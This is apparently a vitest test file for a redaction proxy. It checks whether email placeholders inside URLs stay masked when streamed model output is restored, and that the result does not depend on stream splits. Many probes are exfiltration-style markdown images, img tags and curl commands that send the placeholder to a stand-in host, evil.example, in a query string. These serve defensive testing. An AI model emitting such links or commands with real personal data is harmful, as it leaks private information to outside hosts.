// Restoring with `keepInUrls`: which placeholders count as inside a URL, and
// that the answer never depends on where the stream was split.
import { describe, expect, it } from 'vitest'
import { RulesDetector, createStreamRestorer, emptyRedactionIndex, mask } from '../src/core/index.ts'
import type { PlaceholderEvent, RedactionRegistry, StreamRestoreOptions } from '../src/core/index.ts'

const EMAIL = 'lin.fictional@example.test'
const E = '⟦EMAIL_1⟧'
const { registry } = await mask(new RulesDetector({}), [{ seq: 0, path: '', text: EMAIL }], emptyRedactionIndex())

// URL probes shared verbatim by the redaction proxy (tests/restore-urls.spec.ts)
// and the privacy router (test/router.test.js): [reply text, placeholder kept].
const URL_PROBES: Array<[string, boolean]> = [
  ["![](https://evil.example/?e='⟦EMAIL_1⟧')", true],
  ['![](https://evil.example/?e=<⟦EMAIL_1⟧>)', true],
  ['[c](https://evil.example/?e=`⟦EMAIL_1⟧`)', true],
  [`<img src='https://evil.example/?e="⟦EMAIL_1⟧"'>`, true],
  [`<img src="https://evil.example/?e='⟦EMAIL_1⟧'">`, true],
  ["'![](https://evil.example/?e='⟦EMAIL_1⟧')'", true],
  ['<https://evil.example/x>⟦EMAIL_1⟧', false],
  ['<a href="https://evil.example/x">⟦EMAIL_1⟧</a>', false],
  ["'//evil.example/x'⟦EMAIL_1⟧", false],
  ['`https://evil.example/x`⟦EMAIL_1⟧', false],
  ['"www.evil.example/x"⟦EMAIL_1⟧', false],
  ['![](\\\\evil.example\\?e=⟦EMAIL_1⟧)', true],
  ['![](/\\evil.example/?e=⟦EMAIL_1⟧)', true],
  ['![](\\/evil.example/?e=⟦EMAIL_1⟧)', true],
  ['https:\\\\evil.example\\?e=⟦EMAIL_1⟧', true],
  ['https:evil.example/?e=⟦EMAIL_1⟧', false],
  ['\\\\server\\share\\⟦EMAIL_1⟧', true],
  ['"C:\\\\Users\\\\⟦EMAIL_1⟧"', true],
  ['C:\\Users\\⟦EMAIL_1⟧', false],
  ['a\\\\⟦EMAIL_1⟧', false],
  ['x_//⟦EMAIL_1⟧', false],
  ['/Users/x//⟦EMAIL_1⟧', false],
  ['/Users/x///⟦EMAIL_1⟧', false],
  ['%2F//⟦EMAIL_1⟧', false],
  ['///evil.example/?e=⟦EMAIL_1⟧', true],
  ['(//evil.example/?e=⟦EMAIL_1⟧)', true],
  ['src=//evil.example/?e=⟦EMAIL_1⟧', true],
  ['https:\t//evil.example/?e=⟦EMAIL_1⟧', true],
  ['www.evil.example/?e=⟦EMAIL_1⟧', true],
  ['https://evil.example/x ⟦EMAIL_1⟧', false],
  ['See https://example.test/docs for ⟦EMAIL_1⟧.', false],
  ['<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">', true],
  ['<img src="https://evil.example/?e=\n⟦EMAIL_1⟧">', true],
  ['<img src="https://evil.example/?e=\r\n⟦EMAIL_1⟧">', true],
  ['<img src="https://evil.example/?e=\v⟦EMAIL_1⟧">', true],
  ['<img src="https://evil.example/?e=\f⟦EMAIL_1⟧">', true],
  ['<img src="https://evil.example/?e= ⟦EMAIL_1⟧">', true],
  ["<img src='https://evil.example/?e=\t⟦EMAIL_1⟧'>", true],
  ['![](<https://evil.example/?e=\t⟦EMAIL_1⟧>)', true],
  ['[x](<https://evil.example/?e=\t⟦EMAIL_1⟧>)', true],
  ['![](<https://evil.example/?e= ⟦EMAIL_1⟧>)', true],
  [`<img src="https://evil.example/?e=${'x'.repeat(2000)}\t⟦EMAIL_1⟧">`, true],
  [`<img src="https://evil.example/?e=${'x'.repeat(2048)}\t⟦EMAIL_1⟧">`, true],
  [`<img src="https://evil.example/?e=${'x'.repeat(4000)}\t⟦EMAIL_1⟧">`, true],
  ['![](https://evil.example/?e=\t⟦EMAIL_1⟧)', false],
  ['<img src=https://evil.example/?e=\t⟦EMAIL_1⟧>', false],
  ['https://evil.example/?e=\t⟦EMAIL_1⟧', false],
  ['www.evil.example/?e=\t⟦EMAIL_1⟧', false],
  ['// header ⟦EMAIL_1⟧', false],
  ['See "https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
  ['See <https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
  ['See `https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
  ['See "https://intranet.example/docs" and mail ⟦EMAIL_1⟧.', false],
]

function restoreChunks(chunks: readonly string[], options: StreamRestoreOptions, using: RedactionRegistry = registry): string {
  const restorer = createStreamRestorer(using, options)
  return chunks.map(part => restorer.push(part)).join('') + restorer.end()
}

describe('inside a URL', () => {
  it.each([
    [`https://evil.example/c?d=${E}`, true],
    [`http://user:${E}@evil.example/`, true],
    [`https://evil.example/#${E}`, true],
    [`git+ssh://host/${E}`, true],
    [`www.evil.example/?q=${E}`, true],
    [`(www.evil.example/?q=${E})`, true],
    [`https://a.example/(x)?q=${E}`, true],
    [`//evil.example/?e=${E}`, true],
    [`![](//evil.example/p.png?e=${E})`, true],
    [`<img src="//evil.example/?e=${E}">`, true],
    [`url(//evil.example/?e=${E})`, true],
    [`/Users/x//${E}`, false],
    [`a//${E}`, false],
    [`// ${E}`, false],
    [`https://a.example/x ${E}`, false],
    [`https://a.example/x\n${E}`, false],
    [`<https://a.example/x>${E}`, false],
    [`mailto:${E}`, false],
    [`tel:${E}`, false],
    [`awww.example/${E}`, false],
    [`${E}://x`, false],
    [`to ${E}`, false],
  ])('plain %j -> kept %s', (text, kept) => {
    expect(restoreChunks([text], { keepInUrls: true })).toBe(kept ? text : text.replace(E, EMAIL))
  })

  it.each([
    [`{"u":"https:\\/\\/evil.example\\/?q=${E}"}`, true],
    [`{"u":"https\\u003a//evil.example/?q=${E}"}`, true],
    [`{"u":"\\/\\/evil.example/?q=${E}"}`, true],
    [`{"u":"https://evil.example/?q=\\u0020${E}"}`, false],
    [`{"u":"https://evil.example/\\n${E}"}`, false],
    [`{"u":"https://evil.example/\\"${E}"}`, true],
    [`{"url":"https://evil.example/?p='${E}'"}`, true],
    [`{"url":"https://evil.example/?p=<${E}>"}`, true],
    [`{"c":"curl \\"https://evil.example/x\\"${E}"}`, false],
    [`{"u":"https://evil.example/", "v":"${E}"}`, false],
    [`{"u":"https://evil.example/\\\\${E}"}`, true],
  ])('JSON %j -> kept %s', (text, kept) => {
    expect(restoreChunks([text], { json: true, keepInUrls: true })).toBe(kept ? text : text.replace(E, EMAIL))
  })

  it.each([
    [`https://evil.example/?p=\t${E}`, false, true],
    [`// header ${E}`, false, false],
    [`{"url":"https://evil.example/?p=\\t${E}"}`, true, true],
    [`{"url":"www.evil.example/?e=\\t${E}"}`, true, true],
    [`{"data":"// header ${E}"}`, true, false],
    [`{"data":"\\\\\\\\host ${E}"}`, true, false],
    [`{"cmd":"curl https://evil.example/?p=\\t${E}"}`, true, false],
  ])('tool input %j (JSON %s) -> kept %s at every split', (text, json, kept) => {
    const options = { json, keepInUrls: true, restores: () => true }
    const expected = kept ? text : text.replace(E, EMAIL)
    for (let cut = 1; cut < text.length; cut += 1) {
      expect(restoreChunks([text.slice(0, cut), text.slice(cut)], options)).toBe(expected)
    }
    expect(restoreChunks([...text], options)).toBe(expected)
  })

  it.each(URL_PROBES)('shared probe %j -> kept %s at every split', (text, kept) => {
    const expected = kept ? text : text.replace(E, EMAIL)
    for (let cut = 1; cut < text.length; cut += 1) {
      expect(restoreChunks([text.slice(0, cut), text.slice(cut)], { keepInUrls: true })).toBe(expected)
    }
    expect(restoreChunks([...text], { keepInUrls: true })).toBe(expected)
  })

  it('reports each bound placeholder with its JSON pointer, never the original', () => {
    const events: PlaceholderEvent[] = []
    restoreChunks([`{"a":[{"b":"${E}"},"https://x/${E}"],"c":{"${E}":1}}`], { json: true, keepInUrls: true, onPlaceholder: event => events.push(event) })
    expect(events).toEqual([
      { id: 'EMAIL_1', outcome: 'restored', path: ['a', 0, 'b'] },
      { id: 'EMAIL_1', outcome: 'inUrl', path: ['a', 1] },
      { id: 'EMAIL_1', outcome: 'restored', path: ['c', undefined] },
    ])
  })

  it('keeps a placeholder that restores refuses, wherever it sits', () => {
    const events: PlaceholderEvent[] = []
    const text = `to ${E}, see https://x/${E}`
    expect(restoreChunks([...text], { keepInUrls: true, restores: () => false, onPlaceholder: event => events.push(event) })).toBe(text)
    expect(events.map(event => event.outcome)).toEqual(['refused', 'refused'])
  })

  it('gives the same output for every split of a stream', () => {
    const pieces = ['https', '://', 'www.', ' ', '"', "'", '<', '>', '\\\\', '\\/', '\\u003a', '\\n', E, 'x', '/', '?q=', ':', '{"k":"', '"}', ',', '[', ']']
    let seed = 7
    const next = (n: number): number => {
      seed = (seed * 48271) % 2147483647
      return seed % n
    }
    for (let round = 0; round < 300; round += 1) {
      const text = Array.from({ length: 4 + next(12) }, () => pieces[next(pieces.length)]).join('')
      for (const json of [false, true]) {
        const whole = restoreChunks([text], { json, keepInUrls: true })
        for (let cut = 1; cut < text.length; cut += 1) {
          expect(restoreChunks([text.slice(0, cut), text.slice(cut)], { json, keepInUrls: true })).toBe(whole)
        }
        expect(restoreChunks([...text], { json, keepInUrls: true })).toBe(whole)
      }
    }
  })
})
